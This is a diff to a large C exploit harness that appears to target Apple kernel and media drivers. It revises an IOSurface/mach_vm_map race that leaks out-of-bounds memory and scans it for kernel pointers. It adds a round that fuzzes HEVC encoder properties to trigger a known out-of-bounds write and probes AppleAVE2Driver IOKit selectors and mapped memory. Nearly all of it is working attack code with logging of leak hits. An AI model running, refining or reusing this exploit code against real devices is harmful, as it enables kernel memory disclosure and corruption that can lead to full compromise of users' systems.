@@ -17641,20 +17641,23 @@ static void *r473_osc_thread(void *arg) {
     struct r473_shared *s = (struct r473_shared *)arg;
     pthread_set_qos_class_self_np(QOS_CLASS_USER_INTERACTIVE, 0);
     mach_port_t self = mach_task_self();
-    mach_vm_address_t tgt = s->target;
-    mach_vm_size_t sz = s->target_size;
     mach_port_t le = s->large_entry;
     mach_port_t se = s->small_entry;
+    mach_vm_size_t large_sz = s->target_size;        /* 128K */
+    mach_vm_size_t small_sz = R473_SMALL_PG * R473_PAGE_SZ; /* 16K */
     while (!s->go) __asm__ volatile("yield");
     while (!s->stop) {
+        mach_vm_address_t tgt = s->target;
+        /* Restore: map large surface over the full 128K range */
         mach_vm_address_t t = tgt;
-        mach_vm_map(self, &t, sz, 0,
+        mach_vm_map(self, &t, large_sz, 0,
             VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
             le, 0, FALSE,
             VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE,
             VM_INHERIT_NONE);
+        /* Attack: overwrite just the first page with the small surface (16K) */
         t = tgt;
-        kern_return_t kr = mach_vm_map(self, &t, sz, 0,
+        kern_return_t kr = mach_vm_map(self, &t, small_sz, 0,
             VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
             se, 0, FALSE,
             VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE,
@@ -17717,9 +17720,9 @@ static void r473_exploit(void) {
     memset(IOSurfaceGetBaseAddress(large_surf), 0xAA, R473_LARGE_SZ);
     IOSurfaceUnlock(large_surf, 0, NULL);
     mach_port_t large_entry = IOSurfaceCreateMachPort(large_surf);
-    rlog("    large: %d pages, entry=0x%x, phys_contig=%d\n",
+    rlog("    large: %d pages, entry=0x%x, alloc=%d\n",
          R473_LARGE_PG, large_entry,
-         0 /* phys_contig query removed — private symbol */);
+         (int)IOSurfaceGetAllocSize(large_surf));
 
     /* Phase 2: Create SMALL IOSurface (1 page, 16K) */
     rlog("\n  --- Phase 2: Small IOSurface (%d page) ---\n", R473_SMALL_PG);
@@ -17784,75 +17787,103 @@ static void r473_exploit(void) {
         pthread_create(&osc_tids[t], NULL, r473_osc_thread, &shared);
 
     int total_races = 0, race_wins = 0, oob_reads = 0;
-    int einval_count = 0;
+    int einval_count = 0, short_writes = 0;
+    int small_wins = 0; /* first 16K = 0xBB → small surface was read */
 
     shared.go = 1;
     __sync_synchronize();
 
-    for (uint64_t sp = 0; sp < search_pages && sp < R473_ITERS; sp++) {
+    uint8_t *readbuf = malloc(R473_WRITE_SZ);
+    if (!readbuf) { rlog("    malloc failed\n"); goto r473_cleanup; }
+
+    for (int iter = 0; iter < R473_ITERS * 10; iter++) {
+        uint64_t sp = iter % search_pages;
         mach_vm_address_t addr = search_base + sp * R473_LARGE_SZ;
         shared.target = addr;
         __sync_synchronize();
 
+        /* Re-fill large surface mapping before each attempt */
+        mach_vm_address_t t = addr;
+        mach_vm_map(mach_task_self(), &t, R473_LARGE_SZ, 0,
+            VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
+            large_entry, 0, FALSE,
+            VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE,
+            VM_INHERIT_NONE);
+
         struct iovec iov = { (void *)addr, R473_WRITE_SZ };
-        lseek(fd, 0, SEEK_SET);
         ssize_t w = pwritev(fd, &iov, 1, 0);
         int save_errno = errno;
         total_races++;
 
         if (w == (ssize_t)R473_WRITE_SZ) {
-            lseek(fd, 0, SEEK_SET);
-            uint8_t readbuf[R473_WRITE_SZ];
-            ssize_t r = read(fd, readbuf, R473_WRITE_SZ);
+            ssize_t r = pread(fd, readbuf, R473_WRITE_SZ, 0);
             if (r < (ssize_t)R473_WRITE_SZ) continue;
 
-            int has_oob = 0;
-            int kptrs = 0;
-            for (size_t off = R473_SMALL_SZ; off < R473_WRITE_SZ; off += 8) {
-                uint64_t val;
-                memcpy(&val, readbuf + off, 8);
-                if (val != 0xAAAAAAAAAAAAAAAAULL) {
-                    has_oob = 1;
-                    uint64_t top = val >> 32;
-                    if (top == 0xfffffff0 || top == 0xfffffff1 ||
-                        top == 0xfffffff2 || top == 0xfffffff3 ||
-                        top == 0xfffffff4 || top == 0xfffffff5 ||
-                        top == 0xfffffff6 || top == 0xfffffff7) {
-                        kptrs++;
-                    }
-                }
+            /* Check if first 16K came from small surface (0xBB) */
+            int first_bb = 1;
+            for (size_t c = 0; c < 64; c++) {
+                if (readbuf[c] != 0xBB) { first_bb = 0; break; }
             }
 
-            if (has_oob) {
-                race_wins++;
+            if (first_bb) {
+                small_wins++;
+                /* Race won! Check what's past the small surface's 16K */
+                int kptrs = 0;
+                int non_aa = 0;
+                for (size_t off = R473_SMALL_SZ; off < R473_WRITE_SZ; off += 8) {
+                    uint64_t val;
+                    memcpy(&val, readbuf + off, 8);
+                    if (val != 0xAAAAAAAAAAAAAAAAULL &&
+                        val != 0xBBBBBBBBBBBBBBBBULL) {
+                        non_aa++;
+                        uint64_t top = val >> 32;
+                        if (top >= 0xfffffff0 && top <= 0xfffffff7)
+                            kptrs++;
+                    }
+                }
                 if (kptrs > 0) {
                     oob_reads++;
-                    rlog("    *** OOB HIT sp=%llu: %d kernel ptrs! ***\n",
-                         (unsigned long long)sp, kptrs);
-                    rlog("    First 64 bytes past small surface:\n    ");
+                    rlog("    *** PHYSICAL OOB HIT iter=%d: %d kptrs, %d non-AA ***\n",
+                         iter, kptrs, non_aa);
+                    rlog("    Bytes 16K..16K+64:\n    ");
                     for (int b = 0; b < 64; b++)
                         rlog("%02x ", readbuf[R473_SMALL_SZ + b]);
                     rlog("\n");
-                } else if (race_wins <= 5 || race_wins % 20 == 0) {
-                    rlog("    OOB win sp=%llu (non-0xAA data, no kptrs yet)\n",
-                         (unsigned long long)sp);
+                    rlog("    Bytes 32K..32K+64:\n    ");
+                    for (int b = 0; b < 64; b++)
+                        rlog("%02x ", readbuf[2 * R473_SMALL_SZ + b]);
+                    rlog("\n");
+                } else if (non_aa > 0) {
+                    race_wins++;
+                    if (race_wins <= 5 || race_wins % 50 == 0)
+                        rlog("    OOB data iter=%d: %d non-AA qwords (no kptrs)\n",
+                             iter, non_aa);
+                } else if (small_wins <= 5 || small_wins % 50 == 0) {
+                    rlog("    small_win iter=%d: first=0xBB, rest=0xAA (no OOB)\n",
+                         iter);
                 }
             }
+        } else if (w > 0 && w < (ssize_t)R473_WRITE_SZ) {
+            short_writes++;
         } else if (w < 0 && save_errno == EINVAL) {
             einval_count++;
         }
     }
+
+    free(readbuf);
+    readbuf = NULL;
 
     shared.stop = 1;
     __sync_synchronize();
     for (int t = 0; t < R473_OSC_THREADS; t++)
         pthread_join(osc_tids[t], NULL);
 
-    rlog("\n    TOTAL: races=%d wins=%d oob_kptrs=%d einval=%d osc=%d\n",
-         total_races, race_wins, oob_reads, einval_count,
-         shared.remap_count);
+    rlog("\n    TOTAL: races=%d small_wins=%d oob_data=%d oob_kptrs=%d einval=%d short=%d osc=%d\n",
+         total_races, small_wins, race_wins, oob_reads,
+         einval_count, short_writes, shared.remap_count);
 
-    /* Cleanup */
+r473_cleanup:
+    if (readbuf) free(readbuf);
     mach_vm_deallocate(mach_task_self(), search_base, R473_SEARCH_SZ);
     mach_port_deallocate(mach_task_self(), large_entry);
     mach_port_deallocate(mach_task_self(), small_entry);
@@ -19129,6 +19160,337 @@ static void r475_exploit(void) {
     }
 
     rlog("\n=== r475 complete ===\n");
+    fflush(stdout);
+}
+
+/* ============================================================
+ * r476: HEVC NTL=8 multi-encode + alternate OOB vector discovery
+ *
+ * Findings so far:
+ *   - NTL is HEVC-only (H.264 rejects with -12900)
+ *   - NTL=8 → 1 OOB entry, encode succeeds
+ *   - NTL=9 → 2 OOB entries, process dies
+ *   - NTL=8 OOB writes value=1 at object+0x4694
+ *
+ * This round tests:
+ *   A) Multiple encodes with NTL=8 — does each encode re-trigger the
+ *      OOB write loop? If so, one session encoding 100 frames writes
+ *      value=1 at the same offset 100 times (idempotent, but confirms
+ *      the write happens per-encode, not just once)
+ *   B) Property mutation between encodes — set NTL=8, encode, then try
+ *      to set NTL=100 and encode again (bypass validation?)
+ *   C) DPB (Decoded Picture Buffer) size parameters — CVE-2026-114025
+ *      and others may use different input vectors
+ *   D) Enumerate all HEVC compression properties and test unusual values
+ *   E) Direct AVE2 IOKit user client probing — selectors, mapped memory
+ * ============================================================ */
+
+static void r476_ave_cb(void *ref, void *src, OSStatus st,
+                         VTEncodeInfoFlags fl, CMSampleBufferRef sb) {
+    if (ref) (*(int *)ref)++;
+}
+
+static VTCompressionSessionRef r476_make_hevc(int w, int h, int ntl, int *cb) {
+    CFMutableDictionaryRef sa = CFDictionaryCreateMutable(
+        kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks,
+        &kCFTypeDictionaryValueCallBacks);
+    CFDictionaryRef iop = CFDictionaryCreate(
+        kCFAllocatorDefault, NULL, NULL, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    CFDictionarySetValue(sa, kCVPixelBufferIOSurfacePropertiesKey, iop);
+    CFRelease(iop);
+
+    int pixfmt = kCVPixelFormatType_32BGRA;
+    CFNumberRef fn = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &pixfmt);
+    CFDictionarySetValue(sa, kCVPixelBufferPixelFormatTypeKey, fn);
+    CFRelease(fn);
+
+    VTCompressionSessionRef sess = NULL;
+    OSStatus st = VTCompressionSessionCreate(
+        kCFAllocatorDefault, w, h, kCMVideoCodecType_HEVC,
+        NULL, sa, NULL, r476_ave_cb, cb, &sess);
+    CFRelease(sa);
+    if (st != noErr) { rlog("    session create failed: %d\n", (int)st); return NULL; }
+
+    CFNumberRef n;
+    int v;
+
+    v = 1;
+    n = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &v);
+    VTSessionSetProperty(sess, CFSTR("EncoderUsage"), n);
+    CFRelease(n);
+
+    VTSessionSetProperty(sess, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);
+
+    if (ntl > 0) {
+        n = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &ntl);
+        OSStatus sp = VTSessionSetProperty(sess, CFSTR("NumberOfTemporalLayers"), n);
+        CFRelease(n);
+        if (sp != noErr) {
+            rlog("    NTL=%d rejected: %d\n", ntl, (int)sp);
+            VTCompressionSessionInvalidate(sess);
+            CFRelease(sess);
+            return NULL;
+        }
+    }
+
+    st = VTCompressionSessionPrepareToEncodeFrames(sess);
+    if (st != noErr) {
+        rlog("    prepare failed: %d\n", (int)st);
+        VTCompressionSessionInvalidate(sess);
+        CFRelease(sess);
+        return NULL;
+    }
+    return sess;
+}
+
+static int r476_encode_frame(VTCompressionSessionRef sess, int64_t frame_num) {
+    CVPixelBufferPoolRef pool = VTCompressionSessionGetPixelBufferPool(sess);
+    if (!pool) return -1;
+
+    CVPixelBufferRef pb = NULL;
+    CVReturn cr = CVPixelBufferPoolCreatePixelBuffer(kCFAllocatorDefault, pool, &pb);
+    if (cr != kCVReturnSuccess || !pb) return -2;
+
+    CMTime pts = CMTimeMake(frame_num, 30);
+    OSStatus st = VTCompressionSessionEncodeFrame(sess, pb, pts,
+        kCMTimeInvalid, NULL, NULL, NULL);
+    CVPixelBufferRelease(pb);
+    return (int)st;
+}
+
+static void r476_exploit(void) {
+    rlog("\n=== r476: HEVC NTL=8 multi-encode + alternate OOB vectors ===\n\n");
+    fflush(stdout);
+
+    pthread_set_qos_class_self_np(QOS_CLASS_USER_INTERACTIVE, 0);
+
+    /* ========== Test A: Multiple encodes with NTL=8 ========== */
+    rlog("--- Test A: Multi-encode with NTL=8 ---\n");
+    rlog("  Does the OOB write happen per-encode or once at setup?\n");
+    fflush(stdout);
+    {
+        int cb = 0;
+        VTCompressionSessionRef s = r476_make_hevc(640, 480, 8, &cb);
+        if (s) {
+            int ok = 0, fail = 0;
+            for (int i = 0; i < 20; i++) {
+                int rc = r476_encode_frame(s, i);
+                if (rc == 0) ok++; else fail++;
+            }
+            OSStatus fl = VTCompressionSessionCompleteFrames(s, kCMTimePositiveInfinity);
+            rlog("  NTL=8 x20 encodes: ok=%d fail=%d cb=%d flush=%d\n",
+                 ok, fail, cb, (int)fl);
+            VTCompressionSessionInvalidate(s);
+            CFRelease(s);
+        } else {
+            rlog("  FAILED to create NTL=8 HEVC session\n");
+        }
+        fflush(stdout);
+    }
+
+    /* ========== Test B: Property mutation between encodes ========== */
+    rlog("\n--- Test B: NTL mutation after encode ---\n");
+    rlog("  Set NTL=8, encode, then try NTL=100, encode again\n");
+    fflush(stdout);
+    {
+        int cb = 0;
+        VTCompressionSessionRef s = r476_make_hevc(640, 480, 8, &cb);
+        if (s) {
+            int rc1 = r476_encode_frame(s, 0);
+            rlog("  First encode (NTL=8): rc=%d cb=%d\n", rc1, cb);
+
+            /* Try to change NTL to a large value after first encode */
+            int new_ntls[] = {16, 100, 1000, 8192};
+            for (int i = 0; i < 4; i++) {
+                int ntl = new_ntls[i];
+                CFNumberRef n = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &ntl);
+                OSStatus sp = VTSessionSetProperty(s, CFSTR("NumberOfTemporalLayers"), n);
+                CFRelease(n);
+                rlog("  Set NTL=%d after encode: %d\n", ntl, (int)sp);
+
+                if (sp == noErr) {
+                    int old_cb = cb;
+                    int rc = r476_encode_frame(s, 1 + i);
+                    rlog("  Encode with NTL=%d: rc=%d cb=%d (delta=%d)\n",
+                         ntl, rc, cb, cb - old_cb);
+                }
+                fflush(stdout);
+            }
+            VTCompressionSessionInvalidate(s);
+            CFRelease(s);
+        }
+        fflush(stdout);
+    }
+
+    /* ========== Test C: DPB and other HEVC parameters ========== */
+    rlog("\n--- Test C: DPB and alternate HEVC parameters ---\n");
+    rlog("  Testing properties that may trigger CVE-2026-114025/112689\n");
+    fflush(stdout);
+    {
+        /* Properties that control encoder buffer sizes and may have OOB issues */
+        struct { const char *name; int val; } props[] = {
+            {"NumberOfDPBSlots", 0},
+            {"NumberOfDPBSlots", 1},
+            {"NumberOfDPBSlots", 16},
+            {"NumberOfDPBSlots", 255},
+            {"NumberOfDPBSlots", 65535},
+            {"MaxDPBSize", 0},
+            {"MaxDPBSize", 16},
+            {"MaxDPBSize", 255},
+            {"MaxDPBSize", -1},
+            {"NumberOfReferencePictures", 0},
+            {"NumberOfReferencePictures", 16},
+            {"NumberOfReferencePictures", 255},
+            {"NumberOfBFrames", -1},
+            {"NumberOfBFrames", 0},
+            {"NumberOfBFrames", 100},
+            {"NumberOfBFrames", 65535},
+            {"MaxBFrameCount", 0},
+            {"MaxBFrameCount", 255},
+            {"NumRefP", 0},
+            {"NumRefP", 16},
+            {"NumRefP", 255},
+            {"NumRefBL0", 0},
+            {"NumRefBL0", 255},
+            {"NumRefBL1", 0},
+            {"NumRefBL1", 255},
+            {"MaxSliceBytes", 0},
+            {"MaxSliceBytes", 1},
+            {"MaxSliceBytes", 65535},
+            {"MaxSliceBytes", 0x7FFFFFFF},
+            {"NumberOfSlices", 0},
+            {"NumberOfSlices", 1},
+            {"NumberOfSlices", 255},
+            {"NumberOfSlices", 65535},
+            {"CTBSize", 0},
+            {"CTBSize", 8},
+            {"CTBSize", 64},
+            {"CTBSize", 256},
+            {"MinCUSize", 0},
+            {"MinCUSize", 4},
+            {"MinCUSize", 64},
+            {"MaxCUDepth", 0},
+            {"MaxCUDepth", 255},
+            {"MaxTUDepth", 0},
+            {"MaxTUDepth", 255},
+            {"QPDeltaDepth", -128},
+            {"QPDeltaDepth", 255},
+            {"RateControlMode", 0},
+            {"RateControlMode", 1},
+            {"RateControlMode", 2},
+            {"RateControlMode", 3},
+            {"RateControlMode", 255},
+            {"MCTFLevel", 0},
+            {"MCTFLevel", 1},
+            {"MCTFLevel", 4},
+            {"MCTFLevel", 255},
+        };
+        int np = sizeof(props) / sizeof(props[0]);
+
+        for (int i = 0; i < np; i++) {
+            int cb = 0;
+            VTCompressionSessionRef s = r476_make_hevc(640, 480, 0, &cb);
+            if (!s) continue;
+
+            CFNumberRef n = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &props[i].val);
+            OSStatus sp = VTSessionSetProperty(s, CFStringCreateWithCString(
+                kCFAllocatorDefault, props[i].name, kCFStringEncodingUTF8), n);
+            CFRelease(n);
+
+            if (sp == noErr) {
+                int rc = r476_encode_frame(s, 0);
+                OSStatus fl = VTCompressionSessionCompleteFrames(s, kCMTimePositiveInfinity);
+                rlog("  %s=%d: set=OK encode=%d cb=%d flush=%d\n",
+                     props[i].name, props[i].val, rc, cb, (int)fl);
+            } else {
+                rlog("  %s=%d: rejected=%d\n",
+                     props[i].name, props[i].val, (int)sp);
+            }
+
+            VTCompressionSessionInvalidate(s);
+            CFRelease(s);
+            fflush(stdout);
+        }
+    }
+
+    /* ========== Test D: IOKit AVE2 user client probe ========== */
+    rlog("\n--- Test D: AVE2 IOKit user client ---\n");
+    rlog("  Finding AppleAVE2Driver service and probing external methods\n");
+    fflush(stdout);
+    {
+        io_service_t svc = IOServiceGetMatchingService(
+            kIOMainPortDefault,
+            IOServiceMatching("AppleAVE2Driver"));
+        rlog("  AppleAVE2Driver service: 0x%x\n", svc);
+
+        if (!svc) {
+            svc = IOServiceGetMatchingService(
+                kIOMainPortDefault,
+                IOServiceMatching("AppleAVE2UserClient"));
+            rlog("  AppleAVE2UserClient service: 0x%x\n", svc);
+        }
+
+        if (svc) {
+            /* Try to open user client connections */
+            for (int type = 0; type <= 7; type++) {
+                io_connect_t conn = 0;
+                kern_return_t kr = IOServiceOpen(svc, mach_task_self(), type, &conn);
+                if (kr == KERN_SUCCESS && conn) {
+                    rlog("  Type %d: opened (conn=0x%x)\n", type, conn);
+
+                    /* Probe external methods 0-20 with NULL args to see which exist */
+                    for (uint32_t sel = 0; sel <= 20; sel++) {
+                        uint64_t out[4] = {};
+                        uint32_t outcnt = 4;
+                        kr = IOConnectCallScalarMethod(conn, sel, NULL, 0, out, &outcnt);
+                        if (kr != 0xe00002c2 /* kIOReturnBadArgument */ &&
+                            kr != 0xe00002bc /* kIOReturnUnsupported */) {
+                            rlog("  Type %d sel %d: kr=0x%x out=[0x%llx,0x%llx] cnt=%u\n",
+                                 type, sel, kr, out[0], out[1], outcnt);
+                        }
+                    }
+
+                    /* Check mapped memory types */
+                    for (uint32_t memtype = 0; memtype <= 5; memtype++) {
+                        mach_vm_address_t addr = 0;
+                        mach_vm_size_t size = 0;
+                        kr = IOConnectMapMemory64(conn, memtype, mach_task_self(),
+                            &addr, &size, kIOMapAnywhere);
+                        if (kr == KERN_SUCCESS) {
+                            rlog("  Type %d mem %d: addr=0x%llx size=0x%llx\n",
+                                 type, memtype, (uint64_t)addr, (uint64_t)size);
+                            IOConnectUnmapMemory64(conn, memtype, mach_task_self(), addr);
+                        }
+                    }
+
+                    IOServiceClose(conn);
+                } else if (kr != 0xe00002c2 && kr != 0xe00002bc) {
+                    rlog("  Type %d: open failed kr=0x%x\n", type, kr);
+                }
+            }
+            IOObjectRelease(svc);
+        } else {
+            rlog("  No AVE2 driver service found\n");
+        }
+
+        /* Also look for related services */
+        const char *svc_names[] = {
+            "AppleH16ANEInterface",
+            "AppleSPU",
+            "AppleJPEGDriver",
+            "AppleAVD",
+            "IOSurface",
+        };
+        for (int i = 0; i < 5; i++) {
+            io_service_t s = IOServiceGetMatchingService(
+                kIOMainPortDefault, IOServiceMatching(svc_names[i]));
+            rlog("  %s: 0x%x\n", svc_names[i], s);
+            if (s) IOObjectRelease(s);
+        }
+    }
+
+    rlog("\n=== r476 complete ===\n");
     fflush(stdout);
 }
 
@@ -89203,6 +89565,12 @@ new_modes:
             r472_exploit();
             goto done;
         }
+        if (rounds == 479) {
+            rlog("*** rounds=479: HEVC NTL=8 multi-encode + alternate OOB vectors ***\n\n");
+            fflush(stdout);
+            r476_exploit();
+            goto done;
+        }
         if (rounds == 478) {
             rlog("*** rounds=478: H.264 NTL OOB + zone-targeted heap groom ***\n\n");
             fflush(stdout);
@@ -92086,7 +92454,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445 && rounds != 446 && rounds != 447 && rounds != 448 && rounds != 449 && rounds != 450 && rounds != 451 && rounds != 455 && rounds != 454 && rounds != 456 && rounds != 457 && rounds != 458 && rounds != 459 && rounds != 475 && rounds != 478 && rounds != 477 && rounds != 476 && rounds != 475 && rounds != 474 && rounds != 473 && rounds != 472 && rounds != 471 && rounds != 470 && rounds != 469 && rounds != 468 && rounds != 467 && rounds != 466 && rounds != 465 && rounds != 464 && rounds != 463 && rounds != 462 && rounds != 461 && rounds != 460 && rounds != 452 && rounds != 453) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445 && rounds != 446 && rounds != 447 && rounds != 448 && rounds != 449 && rounds != 450 && rounds != 451 && rounds != 455 && rounds != 454 && rounds != 456 && rounds != 457 && rounds != 458 && rounds != 459 && rounds != 475 && rounds != 479 && rounds != 478 && rounds != 477 && rounds != 476 && rounds != 475 && rounds != 474 && rounds != 473 && rounds != 472 && rounds != 471 && rounds != 470 && rounds != 469 && rounds != 468 && rounds != 467 && rounds != 466 && rounds != 465 && rounds != 464 && rounds != 463 && rounds != 462 && rounds != 461 && rounds != 460 && rounds != 452 && rounds != 453) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
